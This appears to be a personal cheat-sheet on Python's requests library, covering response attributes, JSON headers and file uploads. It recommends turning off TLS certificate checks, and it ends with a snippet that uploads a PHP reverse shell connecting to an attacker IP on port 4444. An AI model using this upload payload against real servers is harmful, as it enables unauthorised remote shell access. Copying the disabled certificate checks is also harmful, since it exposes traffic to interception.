
-----------------------
PYTHON3 HTTP requests
-----------------------
pip install requests 

NEVER name FILE as requests.py 

IGNORE WRONG CERTIFICATE:

requests.get(URL,verify=False)

Supress warnings: 

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

Test it here httpbin.org 

### MIME type = media type -
MIME is Multipurpose Internet Mail Extension 

What is the correct MIME type FOR JSON ??

you're sending JSON to the server or receiving JSON from the server, you should always declare the 

CONTENT-TYPE OF THE HEADER AS APPLICATION/JSON , but older format would be 'text/plain'.

SO IF SENDING CORRECT JSON FORMAT: -H 'Content-Type: application/json' 

BUT IF YOU EXPECT JSON on output: YOU GO FOR: 

curl -H "Accept: application/json"

"The Accept request-header field can be used to specify certain media types which are acceptable for the response."

import requests 

r = requests.get(URL,params={dictionary},data=data,auth(),timeout=3,params=params,)

r -> OBJECT 

r.ok - generalised as OK response - return TRUE for any code less than 400

r.raw

r.text -> content in unicode 

r.content -> in bytes 

r.status_code 

r.json() - beware - this is METHOD not a value 

r.headers 

r.is_redirect

r.is_permanent_redirect

Upload file:
--------------

files = {'upload_file': open('file.txt','rb')}

r = requests.post(url, files=files)  
  
Upload php shell:

session.post(target+'/import', files={'file': ('shell.php6', f'<?php
$s=fsockopen("{attacker_ip}",4444);$p=proc_open("/bin/sh - i"
,array(0=>$s,1=>$s,2=>$s),$pipes); ?>')})
